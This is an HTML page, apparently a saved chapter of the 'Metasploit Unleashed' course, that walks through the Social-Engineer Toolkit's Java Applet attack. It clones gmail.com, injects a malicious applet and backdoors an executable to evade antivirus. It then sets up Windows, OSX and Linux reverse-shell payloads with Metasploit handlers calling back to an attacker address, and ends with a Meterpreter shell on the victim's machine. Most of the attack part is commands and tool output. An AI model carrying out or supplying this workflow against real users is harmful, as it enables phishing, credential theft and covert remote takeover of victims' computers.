<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Java Applet Attack Vector</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Java
Applet Attack Vector</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">The Java Applet is one of the core
attack vectors within SET and has
the highest success rate for compromise. The Java Applet attack will
create a malicious Java Applet that once run, will completely
compromise the victim. The neat trick with SET is that you can
completely clone a website and once the victim has clicked run, it will
redirect the victim back to the original site making the attack much
more believable. This attack vector affects Windows, Linux, and OSX and
can compromise them all. Remember, if you want to customize this attack
vector, edit the config/set_config in order to change the self-signed
certificate information. In this specific attack vector, you can select
web templates which are pre-defined websites that have already been
harvested, or you can import your own website. In this example we will
be using the site cloner which will clone a website for us. Let&#8217;s
launch SET and prep our attack.
<br>
<br>
</p>
<pre id="code">Select from the menu:<br><br>1.  Spear-Phishing Attack Vectors<br>2.  Website Attack Vectors<br>3.  Infectious Media Generator<br>4.  Create a Payload and Listener<br>5.  Mass Mailer Attack<br>6.  Teensy USB HID Attack Vector<br>7.  SMS Spoofing Attack Vector<br>8   Update the Metasploit Framework<br>9.  Update the Social-Engineer Toolkit<br>10. Help, Credits, and About<br>11. Exit the Social-Engineer Toolkit<br><br>Enter your choice: 2<br><br>The Social-Engineer Toolkit "Web Attack" vector is a unique way of<br>utilizing multiple web-based attacks in order to compromise the<br>intended victim.<br><br>Enter what type of attack you would like to utilize.<br><br>The Java Applet attack will spoof a Java Certificate and<br>deliver a metasploit based payload. Uses a customized<br>java applet created by Thomas Werth to deliver<br>the payload.<br><br>The Metasploit browser exploit method will utilize select<br>Metasploit browser exploits through an iframe and deliver<br>a Metasploit payload.<br><br>The Credential Harvester Method will utilize web cloning<br>of a website that has a username and password field and<br>harvest all the information posted to the website.<br><br>The TabNabbing Method will wait for a user to move to a<br>different tab, then refresh the page to something different.<br><br>The Man Left in the Middle Attack Method was introduced by<br>Kos and utilizes HTTP REFERER's in order to intercept fields<br>and harvest data from them. You need to have an already vulnerable<br>site and incorporate script src="http://YOURIP/". This could either<br>be from a compromised site or through XSS.<br><br>The web jacking attack method was introduced by white_sheep, Emgent<br>and the Back|Track team. This method utilizes iframe replacements to<br>make the highlighted URL link to appear legitimate however when clicked<br>a window pops up then is replaced with the malicious link. You can edit<br>the link replacement settings in the set_config if its to slow/fast.<br><br>The multi-attack will add a combination of attacks through the web attack<br>menu. For example you can utilize the Java Applet, Metasploit Browser,<br>Credential Harvester/Tabnabbing, and the Man Left in the Middle attack<br>all at once to see which is successful.<br><br>1. The Java Applet Attack Method<br>2. The Metasploit Browser Exploit Method<br>3. Credential Harvester Attack Method<br>4. Tabnabbing Attack Method<br>5. Man Left in the Middle Attack Method<br>6. Web Jacking Attack Method<br>7. Multi-Attack Web Method<br>8. Return to the previous menu<br><br>Enter your choice (press enter for default): 1<br><br><br>The first method will allow SET to import a list of pre-defined<br>web applications that it can utilize within the attack.<br><br>The second method will completely clone a website of your choosing<br>and allow you to utilize the attack vectors within the completely<br>same web application you were attempting to clone.<br><br>The third method allows you to import your own website, note that you<br>should only have an index.html when using the import website<br>functionality.<br><br>[!] Website Attack Vectors [!]<br><br>1. Web Templates<br>2. Site Cloner<br>3. Custom Import<br>4. Return to main menu<br><br>Enter number (1-4): 2<br><br>SET supports both HTTP and HTTPS<br>Example: http://www.thisisafakesite.com<br>Enter the url to clone: https://gmail.com<br><br>[*] Cloning the website: https://gmail.com<br>[*] This could take a little bit...<br>[*] Injecting Java Applet attack into the newly cloned website.<br>[*] Filename obfuscation complete. Payload name is: tgbYm1k69<br>[*] Malicious java applet website prepped for deployment<br><br>What payload do you want to generate:<br><br>Name:                                      Description:<br><br>1. Windows Shell Reverse_TCP               Spawn a command shell on victim and send back to attacker.<br>2. Windows Reverse_TCP Meterpreter         Spawn a meterpreter shell on victim and send back to attacker.<br>3. Windows Reverse_TCP VNC DLL             Spawn a VNC server on victim and send back to attacker.<br>4. Windows Bind Shell                      Execute payload and create an accepting port on remote system.<br>5. Windows Bind Shell X64                  Windows x64 Command Shell, Bind TCP Inline<br>6. Windows Shell Reverse_TCP X64           Windows X64 Command Shell, Reverse TCP Inline<br>7. Windows Meterpreter Reverse_TCP X64     Connect back to the attacker (Windows x64), Meterpreter<br>8. Windows Meterpreter Egress Buster       Spawn a meterpreter shell and find a port home via multiple ports<br>9. Import your own executable              Specify a path for your own executable<br><br>Enter choice (hit enter for default): 2<br><br>Below is a list of encodings to try and bypass AV.<br><br>Select one of the below, 'backdoored executable' is typically the best.<br><br>1. avoid_utf8_tolower (Normal)<br>2. shikata_ga_nai (Very Good)<br>3. alpha_mixed (Normal)<br>4. alpha_upper (Normal)<br>5. call4_dword_xor (Normal)<br>6. countdown (Normal)<br>7. fnstenv_mov (Normal)<br>8. jmp_call_additive (Normal)<br>9. nonalpha (Normal)<br>10. nonupper (Normal)<br>11. unicode_mixed (Normal)<br>12. unicode_upper (Normal)<br>13. alpha2 (Normal)<br>14. No Encoding (None)<br>15. Multi-Encoder (Excellent)<br>16. Backdoored Executable (BEST)<br><br>Enter your choice (enter for default): 16<br>[-] Enter the PORT of the listener (enter for default): 443<br><br>[-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...<br>[-] Backdoor completed successfully. Payload is now hidden within a legit executable.<br><br>********************************************************<br>Do you want to create a Linux/OSX reverse_tcp payload<br>in the Java Applet attack as well?<br>********************************************************<br><br>Enter choice yes or no: yes<br>Enter the port to listen for on OSX: 8080<br>Enter the port to listen for on Linux: 8081<br>Created by msfpayload (http://www.metasploit.com).<br>Payload: osx/x86/shell_reverse_tcp<br> Length: 65<br>Options: LHOST=172.16.32.129,LPORT=8080<br>Created by msfpayload (http://www.metasploit.com).<br>Payload: linux/x86/shell/reverse_tcp<br> Length: 50<br>Options: LHOST=172.16.32.129,LPORT=8081<br><br>***************************************************<br>Web Server Launched. Welcome to the SET Web Attack.<br>***************************************************<br><br>[--] Tested on IE6, IE7, IE8, Safari, Chrome, and FireFox [--]<br><br>[*] Launching MSF Listener...<br>[*] This may take a few to load MSF...<br>[-] ***<br>[-] * WARNING: No database support: String User Disabled Database Support<br>[-] ***<br><br>                                  _<br>                                 | |      o<br> _  _  _    _ _|_  __,   ,    _  | |  __    _|_<br>/ |/ |/ |  |/  |  /  |  / \_|/ \_|/  /  \_|  |<br>  |  |  |_/|__/|_/\_/|_/ \/ |__/ |__/\__/ |_/|_/<br>                           /|<br>                           \|<br><br><br>       =[ metasploit v3.4.2-dev [core:3.4 api:1.0]<br>+ -- --=[ 588 exploits - 300 auxiliary<br>+ -- --=[ 224 payloads - 27 encoders - 8 nops<br>       =[ svn r10268 updated today (2010.09.09)<br><br>resource (src/program_junk/meta_config)&gt; use exploit/multi/handler<br>resource (src/program_junk/meta_config)&gt; set PAYLOAD windows/meterpreter/reverse_tcp<br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br>resource (src/program_junk/meta_config)&gt; set LHOST 0.0.0.0<br>LHOST =&gt; 0.0.0.0<br>resource (src/program_junk/meta_config)&gt; set LPORT 443<br>LPORT =&gt; 443<br>resource (src/program_junk/meta_config)&gt; set ExitOnSession false<br>ExitOnSession =&gt; false<br>resource (src/program_junk/meta_config)&gt; exploit -j<br>[*] Exploit running as background job.<br>resource (src/program_junk/meta_config)&gt; use exploit/multi/handler<br>resource (src/program_junk/meta_config)&gt; set PAYLOAD osx/x86/shell_reverse_tcp<br>PAYLOAD =&gt; osx/x86/shell_reverse_tcp<br>resource (src/program_junk/meta_config)&gt; set LHOST 172.16.32.129<br>LHOST =&gt; 172.16.32.129<br>resource (src/program_junk/meta_config)&gt; set LPORT 8080<br>LPORT =&gt; 8080<br>resource (src/program_junk/meta_config)&gt; set ExitOnSession false<br>ExitOnSession =&gt; false<br>[*] Started reverse handler on 0.0.0.0:443<br>resource (src/program_junk/meta_config)&gt; exploit -j<br>[*] Starting the payload handler...<br>[*] Exploit running as background job.<br>resource (src/program_junk/meta_config)&gt; use exploit/multi/handler<br>resource (src/program_junk/meta_config)&gt; set PAYLOAD linux/x86/shell/reverse_tcp<br>PAYLOAD =&gt; linux/x86/shell/reverse_tcp<br>resource (src/program_junk/meta_config)&gt; set LHOST 172.16.32.129<br>LHOST =&gt; 172.16.32.129<br>resource (src/program_junk/meta_config)&gt; set LPORT 8081<br>LPORT =&gt; 8081<br>resource (src/program_junk/meta_config)&gt; set ExitOnSession false<br>ExitOnSession =&gt; false<br>resource (src/program_junk/meta_config)&gt; set AutoRunScript migrate -f<br>[*] Started reverse handler on 172.16.32.129:8080<br>AutoRunScript =&gt; migrate -f<br>resource (src/program_junk/meta_config)&gt; exploit -j<br>[*] Starting the payload handler...<br>[*] Exploit running as background job.<br>msf exploit(handler) &gt;<br>[*] Started reverse handler on 172.16.32.129:8081<br>[*] Starting the payload handler...</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">In this attack, we have set up our
scenario to clone </span><a style="color: rgb(0, 0, 0);"
 href="https://gmail.com" class="external free" rel="nofollow">https://gmail.com</a><span
 style="color: rgb(0, 0, 0);">
and use the reverse meterpreter attack vector on port 443. We have used
the backdoored executable to hopefully bypass anti-virus and setup the
Metasploit multi-handler to catch the reverse connections. If you
wanted to use an email with this attack vector, you could edit the
config/set_config and change the WEBATTACK_EMAIL=OFF to
WEBATTACK_EMAIL=ON. When you get a victim to click a link or coax him
to your website, it will look something like this:
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:SET_02.png"
 class="image"><img alt="SET 02.png"
 src="http://www.offensive-security.com/w/images/3/32/SET_02.png"
 width="1414" height="566"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
As soon as the victim clicks run, you are presented with a
meterpreter shell, and the victim is redirected back to the original
Google site completely unaware that they have been compromised.
<br>
<br>
</p>
<pre id="code">[*] Sending stage (748544 bytes) to 172.16.32.131<br>[*] Meterpreter session 1 opened (172.16.32.129:443 -&gt; 172.16.32.131:1183) at Thu Sep 09 10:06:57 -0400 2010<br><br>msf exploit(handler) &gt; sessions -i 1<br>[*] Starting interaction with 1...<br><br><u>meterpreter</u> &gt; shell<br>Process 2988 created.<br>Channel 1 created.<br>Microsoft Windows XP [Version 5.1.2600]<br>(C) Copyright 1985-2001 Microsoft Corp.<br><br>C:\Documents and Settings\Administrator\Desktop&gt;</pre>
<br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/SET"
 title="SET">SET</a></div>
<p style="color: rgb(0, 0, 0);"><br>
</p>
</body>
</html>
